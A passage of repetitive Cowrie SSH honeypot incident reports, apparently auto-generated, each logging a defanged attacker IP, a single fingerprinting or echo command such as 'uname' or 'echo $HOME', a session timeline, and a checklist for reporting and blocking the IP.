- [ ] Submit `143.95.209[.]223` to AbuseIPDB if not already reported
- [ ] Block `143.95.209[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a44ca19efc7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:05 |
| **Last Seen** | 2026-07-02 12:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:05:10` | `cowrie.session.connect` |
| `2026-07-02 12:05:10` | `cowrie.client.version` |
| `2026-07-02 12:05:10` | `cowrie.client.kex` |
| `2026-07-02 12:05:11` | `cowrie.login.success` |
| `2026-07-02 12:05:11` | `cowrie.session.params` |
| `2026-07-02 12:05:11` | `cowrie.command.input` |
| `2026-07-02 12:05:11` | `cowrie.log.closed` |
| `2026-07-02 12:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bd4208b9b4c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 12:05 |
| **Last Seen** | 2026-07-02 12:05 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:05:22` | `cowrie.session.connect` |
| `2026-07-02 12:05:23` | `cowrie.client.version` |
| `2026-07-02 12:05:23` | `cowrie.client.kex` |
| `2026-07-02 12:05:29` | `cowrie.login.success` |
| `2026-07-02 12:05:32` | `cowrie.session.params` |
| `2026-07-02 12:05:32` | `cowrie.command.input` |
| `2026-07-02 12:05:34` | `cowrie.log.closed` |
| `2026-07-02 12:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a445c977fb7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:06 |
| **Last Seen** | 2026-07-02 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:06:56` | `cowrie.session.connect` |
| `2026-07-02 12:06:56` | `cowrie.client.version` |
| `2026-07-02 12:06:56` | `cowrie.client.kex` |
| `2026-07-02 12:06:56` | `cowrie.login.success` |
| `2026-07-02 12:06:57` | `cowrie.session.params` |
| `2026-07-02 12:06:57` | `cowrie.command.input` |
| `2026-07-02 12:06:57` | `cowrie.log.closed` |
| `2026-07-02 12:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbc7b6dbfc66

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:08 |
| **Last Seen** | 2026-07-02 12:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:08:38` | `cowrie.session.connect` |
| `2026-07-02 12:08:38` | `cowrie.client.version` |
| `2026-07-02 12:08:38` | `cowrie.client.kex` |
| `2026-07-02 12:08:38` | `cowrie.login.success` |
| `2026-07-02 12:08:39` | `cowrie.session.params` |
| `2026-07-02 12:08:39` | `cowrie.command.input` |
| `2026-07-02 12:08:39` | `cowrie.log.closed` |
| `2026-07-02 12:08:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18c25105ba0d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:10 |
| **Last Seen** | 2026-07-02 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:10:13` | `cowrie.session.connect` |
| `2026-07-02 12:10:13` | `cowrie.client.version` |
| `2026-07-02 12:10:13` | `cowrie.client.kex` |
| `2026-07-02 12:10:13` | `cowrie.login.success` |
| `2026-07-02 12:10:14` | `cowrie.session.params` |
| `2026-07-02 12:10:14` | `cowrie.command.input` |
| `2026-07-02 12:10:14` | `cowrie.log.closed` |
| `2026-07-02 12:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0379b1a959de

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:11 |
| **Last Seen** | 2026-07-02 12:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:11:48` | `cowrie.session.connect` |
| `2026-07-02 12:11:48` | `cowrie.client.version` |
| `2026-07-02 12:11:48` | `cowrie.client.kex` |
| `2026-07-02 12:11:49` | `cowrie.login.success` |
| `2026-07-02 12:11:49` | `cowrie.session.params` |
| `2026-07-02 12:11:49` | `cowrie.command.input` |
| `2026-07-02 12:11:50` | `cowrie.log.closed` |
| `2026-07-02 12:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dc338303703

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 12:11 |
| **Last Seen** | 2026-07-02 12:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:11:55` | `cowrie.session.connect` |
| `2026-07-02 12:11:55` | `cowrie.client.version` |
| `2026-07-02 12:11:55` | `cowrie.client.kex` |
| `2026-07-02 12:11:57` | `cowrie.login.success` |
| `2026-07-02 12:11:58` | `cowrie.session.params` |
| `2026-07-02 12:11:58` | `cowrie.command.input` |
| `2026-07-02 12:11:59` | `cowrie.log.closed` |
| `2026-07-02 12:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3919c707dea9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:13 |
| **Last Seen** | 2026-07-02 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:13:26` | `cowrie.session.connect` |
| `2026-07-02 12:13:26` | `cowrie.client.version` |
| `2026-07-02 12:13:26` | `cowrie.client.kex` |
| `2026-07-02 12:13:27` | `cowrie.login.success` |
| `2026-07-02 12:13:27` | `cowrie.session.params` |
| `2026-07-02 12:13:27` | `cowrie.command.input` |
| `2026-07-02 12:13:28` | `cowrie.log.closed` |
| `2026-07-02 12:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f7c5f563e2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:15 |
| **Last Seen** | 2026-07-02 12:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:15:00` | `cowrie.session.connect` |
| `2026-07-02 12:15:00` | `cowrie.client.version` |
| `2026-07-02 12:15:00` | `cowrie.client.kex` |
| `2026-07-02 12:15:01` | `cowrie.login.success` |
| `2026-07-02 12:15:01` | `cowrie.session.params` |
| `2026-07-02 12:15:01` | `cowrie.command.input` |
| `2026-07-02 12:15:02` | `cowrie.log.closed` |
| `2026-07-02 12:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2bc44578810

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 12:15 |
| **Last Seen** | 2026-07-02 12:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:15:30` | `cowrie.session.connect` |
| `2026-07-02 12:15:31` | `cowrie.client.version` |
| `2026-07-02 12:15:31` | `cowrie.client.kex` |
| `2026-07-02 12:15:33` | `cowrie.login.success` |
| `2026-07-02 12:15:36` | `cowrie.session.params` |
| `2026-07-02 12:15:36` | `cowrie.command.input` |
| `2026-07-02 12:15:36` | `cowrie.log.closed` |
| `2026-07-02 12:15:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cddef908eab

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 12:16 |
| **Last Seen** | 2026-07-02 12:16 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:16:24` | `cowrie.session.connect` |
| `2026-07-02 12:16:25` | `cowrie.client.version` |
| `2026-07-02 12:16:25` | `cowrie.client.kex` |
| `2026-07-02 12:16:32` | `cowrie.login.success` |
| `2026-07-02 12:16:35` | `cowrie.session.params` |
| `2026-07-02 12:16:35` | `cowrie.command.input` |
| `2026-07-02 12:16:37` | `cowrie.log.closed` |
| `2026-07-02 12:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14d6dd1a0e73

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:16 |
| **Last Seen** | 2026-07-02 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:16:31` | `cowrie.session.connect` |
| `2026-07-02 12:16:31` | `cowrie.client.version` |
| `2026-07-02 12:16:31` | `cowrie.client.kex` |
| `2026-07-02 12:16:31` | `cowrie.login.success` |
| `2026-07-02 12:16:32` | `cowrie.session.params` |
| `2026-07-02 12:16:32` | `cowrie.command.input` |
| `2026-07-02 12:16:32` | `cowrie.log.closed` |
| `2026-07-02 12:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aec930ed06f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 12:17 |
| **Last Seen** | 2026-07-02 12:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:17:07` | `cowrie.session.connect` |
| `2026-07-02 12:17:07` | `cowrie.client.version` |
| `2026-07-02 12:17:07` | `cowrie.client.kex` |
| `2026-07-02 12:17:09` | `cowrie.login.success` |
| `2026-07-02 12:17:12` | `cowrie.session.params` |
| `2026-07-02 12:17:12` | `cowrie.command.input` |
| `2026-07-02 12:17:13` | `cowrie.log.closed` |
| `2026-07-02 12:17:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0926d4a6363

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:18 |
| **Last Seen** | 2026-07-02 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:18:06` | `cowrie.session.connect` |
| `2026-07-02 12:18:06` | `cowrie.client.version` |
| `2026-07-02 12:18:06` | `cowrie.client.kex` |
| `2026-07-02 12:18:07` | `cowrie.login.success` |
| `2026-07-02 12:18:07` | `cowrie.session.params` |
| `2026-07-02 12:18:07` | `cowrie.command.input` |
| `2026-07-02 12:18:08` | `cowrie.log.closed` |
| `2026-07-02 12:18:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4f9a343eb06

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 12:18 |
| **Last Seen** | 2026-07-02 12:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:18:58` | `cowrie.session.connect` |
| `2026-07-02 12:18:58` | `cowrie.client.version` |
| `2026-07-02 12:18:58` | `cowrie.client.kex` |
| `2026-07-02 12:18:59` | `cowrie.login.success` |
| `2026-07-02 12:19:01` | `cowrie.session.params` |
| `2026-07-02 12:19:01` | `cowrie.command.input` |
| `2026-07-02 12:19:01` | `cowrie.log.closed` |
| `2026-07-02 12:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e36232f0e5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:19 |
| **Last Seen** | 2026-07-02 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:19:49` | `cowrie.session.connect` |
| `2026-07-02 12:19:49` | `cowrie.client.version` |
| `2026-07-02 12:19:49` | `cowrie.client.kex` |
| `2026-07-02 12:19:49` | `cowrie.login.success` |
| `2026-07-02 12:19:50` | `cowrie.session.params` |
| `2026-07-02 12:19:50` | `cowrie.command.input` |
| `2026-07-02 12:19:50` | `cowrie.log.closed` |
| `2026-07-02 12:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4f667546ac9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 12:21 |
| **Last Seen** | 2026-07-02 12:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:21:22` | `cowrie.session.connect` |
| `2026-07-02 12:21:22` | `cowrie.client.version` |
| `2026-07-02 12:21:22` | `cowrie.client.kex` |
| `2026-07-02 12:21:23` | `cowrie.login.success` |
| `2026-07-02 12:21:25` | `cowrie.session.params` |
| `2026-07-02 12:21:25` | `cowrie.command.input` |
| `2026-07-02 12:21:26` | `cowrie.log.closed` |
| `2026-07-02 12:21:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac4223539567

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:21 |
| **Last Seen** | 2026-07-02 12:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:21:28` | `cowrie.session.connect` |
| `2026-07-02 12:21:28` | `cowrie.client.version` |
| `2026-07-02 12:21:28` | `cowrie.client.kex` |
| `2026-07-02 12:21:29` | `cowrie.login.success` |
| `2026-07-02 12:21:29` | `cowrie.session.params` |
| `2026-07-02 12:21:29` | `cowrie.command.input` |
| `2026-07-02 12:21:29` | `cowrie.log.closed` |
| `2026-07-02 12:21:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4264d2d755f2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:23 |
| **Last Seen** | 2026-07-02 12:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:23:06` | `cowrie.session.connect` |
| `2026-07-02 12:23:06` | `cowrie.client.version` |
| `2026-07-02 12:23:06` | `cowrie.client.kex` |
| `2026-07-02 12:23:06` | `cowrie.login.success` |
| `2026-07-02 12:23:07` | `cowrie.session.params` |
| `2026-07-02 12:23:07` | `cowrie.command.input` |
| `2026-07-02 12:23:07` | `cowrie.log.closed` |
| `2026-07-02 12:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b35e65b6d74

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 12:24 |
| **Last Seen** | 2026-07-02 12:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:24:39` | `cowrie.session.connect` |
| `2026-07-02 12:24:39` | `cowrie.client.version` |
| `2026-07-02 12:24:39` | `cowrie.client.kex` |
| `2026-07-02 12:24:39` | `cowrie.login.success` |
| `2026-07-02 12:24:41` | `cowrie.session.params` |
| `2026-07-02 12:24:41` | `cowrie.command.input` |
| `2026-07-02 12:24:41` | `cowrie.log.closed` |
| `2026-07-02 12:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b49159ac474

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:24 |
| **Last Seen** | 2026-07-02 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:24:44` | `cowrie.session.connect` |
| `2026-07-02 12:24:44` | `cowrie.client.version` |
| `2026-07-02 12:24:44` | `cowrie.client.kex` |
| `2026-07-02 12:24:44` | `cowrie.login.success` |
| `2026-07-02 12:24:45` | `cowrie.session.params` |
| `2026-07-02 12:24:45` | `cowrie.command.input` |
| `2026-07-02 12:24:45` | `cowrie.log.closed` |
| `2026-07-02 12:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd08f61a12ea

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 12:25 |
| **Last Seen** | 2026-07-02 12:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:25:52` | `cowrie.session.connect` |
| `2026-07-02 12:25:52` | `cowrie.client.version` |
| `2026-07-02 12:25:52` | `cowrie.client.kex` |
| `2026-07-02 12:25:55` | `cowrie.login.success` |
| `2026-07-02 12:25:56` | `cowrie.session.params` |
| `2026-07-02 12:25:56` | `cowrie.command.input` |
| `2026-07-02 12:25:57` | `cowrie.log.closed` |
| `2026-07-02 12:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aca0f93b9c0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:26 |
| **Last Seen** | 2026-07-02 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:26:24` | `cowrie.session.connect` |
| `2026-07-02 12:26:24` | `cowrie.client.version` |
| `2026-07-02 12:26:24` | `cowrie.client.kex` |
| `2026-07-02 12:26:24` | `cowrie.login.success` |
| `2026-07-02 12:26:25` | `cowrie.session.params` |
| `2026-07-02 12:26:25` | `cowrie.command.input` |
| `2026-07-02 12:26:25` | `cowrie.log.closed` |
| `2026-07-02 12:26:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-103c3c5d9324

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 12:27 |
| **Last Seen** | 2026-07-02 12:27 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:27:28` | `cowrie.session.connect` |
| `2026-07-02 12:27:29` | `cowrie.client.version` |
| `2026-07-02 12:27:29` | `cowrie.client.kex` |
| `2026-07-02 12:27:34` | `cowrie.login.success` |
| `2026-07-02 12:27:37` | `cowrie.session.params` |
| `2026-07-02 12:27:37` | `cowrie.command.input` |
| `2026-07-02 12:27:40` | `cowrie.log.closed` |
| `2026-07-02 12:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-502dc79f8cae

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:28 |
| **Last Seen** | 2026-07-02 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:28:00` | `cowrie.session.connect` |
| `2026-07-02 12:28:00` | `cowrie.client.version` |
| `2026-07-02 12:28:00` | `cowrie.client.kex` |
| `2026-07-02 12:28:00` | `cowrie.login.success` |
| `2026-07-02 12:28:01` | `cowrie.session.params` |
| `2026-07-02 12:28:01` | `cowrie.command.input` |
| `2026-07-02 12:28:01` | `cowrie.log.closed` |
| `2026-07-02 12:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f90a71a4cb5

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 12:29 |
| **Last Seen** | 2026-07-02 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:29:02` | `cowrie.session.connect` |
| `2026-07-02 12:29:02` | `cowrie.client.version` |
